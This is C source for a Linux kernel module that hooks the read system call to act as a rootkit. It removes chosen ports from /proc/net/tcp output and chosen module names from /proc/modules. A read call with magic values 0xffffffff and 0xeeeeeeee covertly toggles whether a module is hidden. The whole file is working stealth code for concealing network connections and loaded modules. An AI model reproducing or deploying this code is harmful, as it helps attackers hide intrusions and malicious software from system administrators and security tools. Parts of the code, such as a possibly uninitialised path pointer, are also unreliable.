#include "read_hook.h"

#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <asm/ptrace.h>

#include "../tools/string_list.h"

char* copy_line(char* from, char* to, uint32_t* copied){
    for(*copied = 0;*from!=0xA && *from!=0x0; ++from, ++to,++(*copied)){
        *to=*from;
    }
    *to=*from;
    ++(*copied);
    ++to;
    return to;
}


extern PStringList hidden_ports;
extern PStringList hidden_modules;
static ssize_t read_payload(int fd, void* buf, size_t count, ssize_t ret){
    char* filename, *f_name_start, *fss, *sss, *tss;
    struct file * f;
    ssize_t new_ret = ret;

    if (ret == 0)
        return ret;

    filename = kzalloc(PATH_MAX+1, GFP_KERNEL);
    if( filename == NULL)
        return ret;
    
    f = fget(fd);
    if(!f)
        goto done;
    
    f_name_start = d_path(&(f->f_path), filename, PATH_MAX);
    if(IS_ERR(f_name_start))
        goto done;


    fss = strstr(f_name_start, "/");
    if (fss !=NULL){
        sss = strstr(fss+1, "/");
        if (sss != NULL)
            tss = strstr(sss+1, "/");
    }
    
    
    if(!strncmp(f_name_start, "/proc", 5) && tss!= NULL && !strcmp(tss, "/net/tcp")){
        char * buffer, *new_buffer, *buf_end, *b_pos, *n_b_pos;
        bool is_first_line = true;
        uint32_t hidded_ports = 0;

        buffer = kzalloc(ret, GFP_KERNEL);
        new_buffer = kzalloc(ret, GFP_KERNEL);
        buf_end = buffer+ret;
        b_pos = buffer;
        n_b_pos = new_buffer;

        copy_from_user(buffer, buf, ret);
        while(true){
            uint32_t copied, number, local_address, remote_address, w1d, w2d;
            uint16_t local_port, remote_port;
            char port[12] = {0};
            if(b_pos >=buf_end)
                break;
            if(is_first_line){
                n_b_pos = copy_line(b_pos, n_b_pos, &copied);
                b_pos+=copied;
                is_first_line = false;
            }
            sscanf(b_pos, "%d: %x:%hx %x:%hx", &number, &local_address, &local_port, &remote_address, &remote_port);
            sprintf(port, "L%d", local_port);
            if(list_have(hidden_ports, port)){
                uint32_t pass_size = 0;
                printk(KERN_INFO "Hide local port %d\n", local_port);
                for(;b_pos<buf_end && *b_pos!=0xA && *b_pos!=0x0;++b_pos,++pass_size){}
                ++pass_size;
                ++b_pos;
                new_ret-=pass_size;
                hidded_ports+=1;
                continue;
            }
            sprintf(port, "R%d", remote_port);
            if(list_have(hidden_ports, port)){
                uint32_t pass_size = 0;
                printk(KERN_INFO "Hide remote port %d\n", remote_port);
                for(;b_pos<buf_end && *b_pos!=0xA && *b_pos!=0x0;++b_pos, ++pass_size){}
                ++pass_size;
                ++b_pos;
                new_ret-=pass_size;
                hidded_ports+=1;
                continue;
            }
            w1d = sprintf(n_b_pos,"   %d: ", number-hidded_ports);
            n_b_pos+=w1d;
            w2d = sprintf(port, "   %d: ", number);
            b_pos+=w2d;
            n_b_pos = copy_line(b_pos, n_b_pos, &copied);
            b_pos+=copied;
        }        

        copy_to_user(buf, new_buffer, new_ret);
        kfree(new_buffer);
        kfree(buffer);        
    }else if(!strcmp(f_name_start, "/proc/modules")){
        char * buffer, *new_buffer, *buf_end, *b_pos, *n_b_pos, *name;
        
        buffer = kzalloc(ret, GFP_KERNEL);
        new_buffer = kzalloc(ret, GFP_KERNEL);
        name = kzalloc(PATH_MAX+1, GFP_KERNEL);
        buf_end = buffer+ret;
        b_pos = buffer;
        n_b_pos = new_buffer;

        copy_from_user(buffer, buf, ret);
        while(true){
            uint32_t copied;
            if(b_pos >=buf_end)
                break;
            memset(name, 0, PATH_MAX);
            sscanf(b_pos, "%256s", name);
            if(list_have(hidden_modules, name)){
                uint32_t pass_size = 0;
                printk(KERN_INFO "Hide module %s\n", name);
                for(;b_pos<buf_end && *b_pos!=0xA && *b_pos!=0x0;++b_pos, ++pass_size){}
                ++pass_size;
                ++b_pos;
                new_ret-=pass_size;
                continue;
            }
            n_b_pos = copy_line(b_pos, n_b_pos, &copied);
            b_pos+=copied;
        }
        copy_to_user(buf, new_buffer, new_ret);
        kfree(name);
        kfree(buffer);
        kfree(new_buffer);
    }

done:
    kfree(filename);
    return new_ret;
}

static long hide_module(char* m_name){
    char *name = kzalloc(NAME_MAX+1, GFP_KERNEL);
    strncpy_from_user(name, m_name, NAME_MAX);
    if(list_have(hidden_modules, name)){
        list_delete(hidden_modules, name);
        printk("Unhide module %s\n", name);
    }else{
        list_insert(hidden_modules, name);
        printk("Hide module %s\n", name);
    }
    kfree(name);
    return 0;
}

#ifdef PTREGS_SYSCALL_STUBS
extern asmlinkage ssize_t (*orig_read)(const struct pt_regs *);
asmlinkage ssize_t hook_read(const struct pt_regs *regs){
    int fd = regs->di;
    void* buf = (void*) regs->si;
    size_t count = regs->dx;
    ssize_t ret;
    if(fd == 0xffffffff && count == 0xeeeeeeee)
        return hide_module(buf);
    ret = orig_read(regs);
    return read_payload(fd, buf, count, ret);
}

#else
extern asmlinkage ssize_t (*orig_read)(int fd, void* buf, size_t count);
asmlinkage ssize_t hook_read(int fd, void* buf, size_t count){
    if(fd == 0xffffffff && count == 0xeeeeeeee)
        return hide_module(buf);
    ssize_t ret = orig_read(fd, buf, count);
    return read_payload(fd, buf, count, ret);
}

#endif
